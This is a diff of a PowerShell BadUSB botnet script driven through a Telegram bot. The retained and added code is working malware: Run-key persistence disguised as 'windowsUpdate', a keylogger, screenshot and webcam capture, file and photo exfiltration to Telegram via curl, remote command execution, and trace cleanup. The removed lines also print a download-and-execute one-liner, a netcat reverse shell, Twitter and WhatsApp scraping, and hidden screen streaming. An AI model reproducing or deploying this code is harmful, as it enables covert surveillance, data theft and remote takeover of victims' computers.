@@ -1,44 +1,8 @@
-
-<#  
-BADUSB COMMANDS:
-    # Execute 
-    powershell.exe -windowstyle hidden -file this_file.ps1
-    #Execute script from github
-    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-REGEDIT:
-	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
-    https://www.akadia.com/services/windows_registry.html 
-BOT TELEGRAM:
-    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
-	#>
-
-
-############
-## CONFIG ##
-############
-
 $BotToken = "1259551971:AAGxEPbYhrAb4F12CZRwvDWtJyF806trRG4"
 $ChatID = '1058178282'
 $githubScript = 'https://raw.githubusercontent.com/Moessec/badusb_botnet/master/poc.ps1'
 
-
-###############
-## FUNCTIONS ##
-###############
-
 function turnOffScreen {
-    # Source: http://www.powershellmagazine.com/2013/07/18/pstip-how-to-switch-off-display-with-powershell/
-
-    # Turn display off by calling WindowsAPI.
- 
-    # SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER, POWER_OFF)
-    # HWND_BROADCAST  0xffff
-    # WM_SYSCOMMAND   0x0112
-    # SC_MONITORPOWER 0xf170
-    # POWER_OFF       0x0002
- 
     Add-Type -TypeDefinition '
     using System;
     using System.Runtime.InteropServices;
@@ -79,12 +43,9 @@ function backdoor {
         Send-Message "Adding_to_the_reg.."
 		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
 
-        # Check backdoor
-        #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
 		
-        # Backdoor on startup programs
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
         Invoke-Expression -Command:$command
 }
@@ -107,20 +68,17 @@ function screenshot {
 }
 
 function cleanAll {
-    # Remove screenshots
+
     Send-Message "Deleting_screenshots.."
     Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"
-    # Remove cUrl
+
     Send-Message "Deleting_cURL.."
     Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"
-    # Remove backdoor
+
     Send-Message "Deleting_backdoor.."
     Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
-    # Remove webcam
-    Send-Message "Deleting_webcam.."
-    Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
-    # Remove netcat
+    
     Send-Message "Deleting_netcat.."
     Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
     Remove-Item "C:\Users\$env:username\Documents\nc.zip"
@@ -129,7 +87,6 @@ function cleanAll {
 function installCurl {
     $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
     if(![System.IO.File]::Exists($curl)){
-        # file with path $path doesn't exist
         $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
         $curl_zip = $ruta + "\curl.zip"
         $curl = $ruta + "\" + "curl.exe"
@@ -141,7 +98,6 @@ function installCurl {
         }
         return $curl
     }
-    # else curl exist
     return $curl    
 }
 
@@ -156,7 +112,7 @@ function sendPhoto {
     Start-Sleep -Seconds 5
     Send-Message "Deleting.."
     Remove-Item $photo
-    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
+    & $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
 
 function Send-Message($message) {
@@ -167,7 +123,6 @@ function Send-Message($message) {
 }
 
 function ipPublic {
-    #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
     $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
     Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
 }
@@ -178,12 +133,10 @@ function download($FileToDownload) {
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 
-    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
+    curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
 function keylogger($seconds) {
-  # Requires -Version 2
-  # Signatures for API Calls
   $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -196,11 +149,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 
   $Path = "$env:temp\keylogger.txt"
-
-  # load signatures and make members available
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
-  # create output file
   $null = New-Item -Path $Path -ItemType File -Force
 
   try {
@@ -247,9 +197,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
 
   finally {
-    # open logger file in Notepad - Only for test
-    #notepad $Path
-
     Write-Host "Downloading keylogger file.."
     Send-Message 'Downloading..'
     download $Path
@@ -316,274 +263,6 @@ function mainBrowser {
      }
 }
 
-function HackTwitterW10 {
-    <#
-    Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
-    Esta funcion solo es válida para W10.
-    Manuales: 
-        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
-    #>
-
-
-    # Inicia un virtual desktop.
-    $KeyShortcut = Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + D: Create a new desktop
-public static void CreateVirtualDesktopInWin10()
-{
-    //Key down
-    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
-    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
-    //Key up
-    
-    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
-}
-"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
-   
-    # Cambia al virtual desktop de la iquierda.
-    $KeyShortcut2 = Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + LEFT: Switch desktop
-public static void SwitchLeftVirtualDesktopInWin10()
-{
-    //Key down
-    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
-    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
-    //Key up
-    
-    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
-}
-"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    
-
-    # Cambia al virtual desktop de la derecha.
-    $KeyShortcut3 = Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + LEFT: Switch desktop
-public static void SwitchRightVirtualDesktopInWin10()
-{
-    //Key down
-    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
-    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
-    //Key up
-    
-    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
-}
-"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    
-
-    $KeyShortcut::CreateVirtualDesktopInWin10()
-    
-    # Inicia el navegador por defecto y abre twitter.
-    $mainBrowser = mainBrowser 
-    Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/messages' 
-    Start-Sleep -Seconds 2
-    $wshell = New-Object -ComObject wscript.shell
-    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
-
-    # Espera 10 segundos a cargar completamente la página
-    Start-sleep -Seconds 10
-
-    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
-    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
-    $wshell.AppActivate('twitter') 
-    $wshell.SendKeys("^{s}") 
-    $wshell.AppActivate('Guardar como')
-    Sleep -Seconds 2 
-    $wshell.SendKeys('t') 
-    Sleep -Seconds 2
-    $wshell.SendKeys('~') 
-    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
-
-    Sleep -Seconds 5
-    Get-ChildItem "C:\Users\$env:username\Downloads\t_files" | Compress-Archive -DestinationPath "C:\Users\$env:username\Downloads\t_files.zip" -CompressionLevel Optimal 
-
-    Sleep -Seconds 5
-    download "C:\Users\$env:username\Downloads\t.html"
-    download "C:\Users\$env:username\Downloads\t_files.zip"
-        
-    Sleep -Seconds 5
-    Remove-Item "C:\Users\$env:username\Downloads\t.html"
-    Remove-Item -Recurse "C:\Users\$env:username\Downloads\t_files"
-    Remove-Item "C:\Users\$env:username\Downloads\t_files.zip"
-}
-
-function hackWhatsAPPW10 {
-   <#
-    No descarga las conversaciones de cada usuario, para ello habria que entrar en cada conversacion para que el JS carge de la BD de whatsapp los mensajes.
-    Manuales: 
-        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
-    #>
-
-
-    # Inicia un virtual desktop.
-    $KeyShortcut = Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + D: Create a new desktop
-public static void CreateVirtualDesktopInWin10()
-{
-    //Key down
-    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
-    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
-    //Key up
-    
-    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
-}
-"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
-   
-    # Cambia al virtual desktop de la iquierda.
-    $KeyShortcut2 = Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + LEFT: Switch desktop
-public static void SwitchLeftVirtualDesktopInWin10()
-{
-    //Key down
-    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
-    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
-    //Key up
-    
-    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
-}
-"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    
-
-    # Cambia al virtual desktop de la derecha.
-    $KeyShortcut3 = Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + LEFT: Switch desktop
-public static void SwitchRightVirtualDesktopInWin10()
-{
-    //Key down
-    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
-    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
-    //Key up
-    
-    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
-    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
-}
-"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    
-
-    $KeyShortcut::CreateVirtualDesktopInWin10()
-    
-    # Inicia el navegador por defecto y abre twitter.
-    $mainBrowser = mainBrowser 
-    Start-Process $mainBrowser -ArgumentList '--new-window https://web.whatsapp.com/' 
-    Start-Sleep -Seconds 2
-    $wshell = New-Object -ComObject wscript.shell
-    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
-
-    # Espera 10 segundos a cargar completamente la página
-    Start-sleep -Seconds 10
-
-    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
-    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
-    $wshell.AppActivate('Mozilla Firefox') 
-    $wshell.SendKeys("^{s}") 
-    $wshell.AppActivate('Guardar como')
-    Sleep -Seconds 2 
-    $wshell.SendKeys('w') 
-    Sleep -Seconds 1 
-    $wshell.SendKeys('~') 
-    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
-
-    Sleep -Seconds 5
-    Get-ChildItem "C:\Users\$env:username\Downloads\w_files" | Compress-Archive -DestinationPath "C:\Users\$env:username\Downloads\w_files.zip" -CompressionLevel Optimal
-
-    Sleep -Seconds 5
-    download "C:\Users\$env:username\Downloads\w.html"
-    download "C:\Users\$env:username\Downloads\w_files.zip"
-
-    Sleep -Seconds 5
-    Remove-Item "C:\Users\$env:username\Downloads\w.html"
-    Remove-Item -Recurse "C:\Users\$env:username\Downloads\w_files"
-    Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
-}
-
-function netcat($ip) {
-    Send-Message "Downloading_netcat.."
-    $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
-    $outpath = "C:\Users\$env:username\Documents\nc.zip"
-    $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
-    
-    Start-Sleep -Seconds 5
-    Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $args = "$ip 8888 -e cmd.exe"
-    $netcat = $outpathUnzip+"\nc.exe"
-
-    Start-Sleep -Seconds 5
-    Send-Message "Connecting.."
-    Send-Message "IP:$ip"
-    Send-Message "Port:8888"
-    Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
-}
-
-function stopnetcat {
-    Send-Message "Stopping_netcat.."
-    taskkill /F /IM nc.exe
-    
-    Sleep -Seconds 5
-    Send-Message "Deleting_netcat.."
-    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
-    Remove-Item "C:\Users\$env:username\Documents\nc.zip" 
-}
-
-function twitch($STREAM_KEY) {
-    Send-Message "Downloading_FFmpeg.."
-    $url = "https://ffmpeg.zeranoe.com/builds/win32/static/ffmpeg-20180828-26dc763-win32-static.zip"
-    $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
-    $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
-
-    Send-Message "Starting_streaming.."
-    Start-Sleep -Seconds 5
-    Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
-    Start-Process -Filepath $FFmpeg "-f gdigrab -s 1920x1080 -framerate 15 -i desktop -c:v libx264 -preset fast -pix_fmt yuv420p -s 1280x800 -threads 0 -f flv rtmp://live-mad.twitch.tv/app/$STREAM_KEY" -windowstyle hidden
-}
-
-function stoptwitch {
-    Send-Message "Stopping twitch.."
-    taskkill /F /IM ffmpeg.exe
-    
-    Sleep -Seconds 5
-    Remove-Item -Recurse "C:\Users\$env:username\Documents\FFmpeg"
-    Remove-Item "C:\Users\$env:username\Documents\FFmpeg.zip"
-}
-
-
-#####################
-## BYPASS POLICIES ##
-#####################
-
-# Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
-
-
-##########################
-## CONNECT WITH CHANNEL ##
-##########################
 
 $whoami = Invoke-Expression whoami
 $ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
@@ -607,23 +286,14 @@ Invoke-WebRequest `
     -ContentType "application/json;charset=utf-8" `
     -Body (ConvertTo-Json -Compress -InputObject $payload)
 
-
-######################
-## WAIT FOR COMMAND ##
-######################
-
-#Time to sleep for each loop before checking if a message with the magic word was received
 $LoopSleep = 3
  
- 
-#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
 $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
 $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
 $LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
  
-#Read the responses in a while cycle
 $DoNotExit = 1
-#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
+
 $PreviousLoop_LastMessageTime = $LastMessageTime_Origin
  
 $SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
@@ -636,20 +306,13 @@ While ($DoNotExit)  {
   $CommandToRun_SimplifiedOutput = ""
   $Message = ""
   
-  #Get the current Bot Updates and store them in an array format to make it easier
   $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
   $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
   
-  #Get just the last message:
   $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
-  #Get the last message time
   $LastMessageTime = $LastMessage.message.date
   
-  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
   If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
-    #Looks like there's a new message!
-    
-	#Update $PreviousLoop_LastMessageTime with the time from the latest message
 	$PreviousLoop_LastMessageTime = $LastMessageTime
 	#Update the LastMessageTime
 	$LastMessageTime = $LastMessage.Message.Date
@@ -660,10 +323,7 @@ While ($DoNotExit)  {
 	  "/select $ipV4 *"  { #Important: run with a space
 	    #The user wants to run a command
 		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
-		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
-		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 		
-		#Run the command
 		Try {
 		  Invoke-Expression $CommandToRun | Out-String | %  {
 		    $CommandToRun_Result += "`n $($_)"
@@ -680,7 +340,6 @@ While ($DoNotExit)  {
 		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
 	  }
 	  "/stop $ipV4"  {
-		#The user wants to stop the script
 		write-host "The script will end in 5 seconds"
 		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
 		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
@@ -701,9 +360,6 @@ While ($DoNotExit)  {
       "/backdoor $ipV4"  {
         backdoor
       }
-      "/meterpreter $ipV4"  {
-         
-      }
       "/cleanAll $ipV4" {
         cleanAll
       }
@@ -714,35 +370,15 @@ While ($DoNotExit)  {
         $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
         download $FileToDownload
       }
-      "/hackT $ipV4"{
-        HackTwitterW10
-      }
       "/webcam $ipV4"{
         webcam
       }
-      "/hackW $ipV4"{
-        hackWhatsAPPW10
-      }
+    
       "/keylogger $ipV4 *"{
         $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
         keylogger seconds $time
       }
-      "/nc $ipV4 *"{
-        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
-        netcat $ip
-      }
-      "/stopnc $ipV4"{
-        stopnetcat
-      }
-      "/starttwitch $ipV4 *"{
-        $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
-        twitch $STREAM_KEY
-      }
-      "/stoptwitch $ipV4"{
-        stoptwitch
-      }
 	  default  {
-	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
 		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 	  }
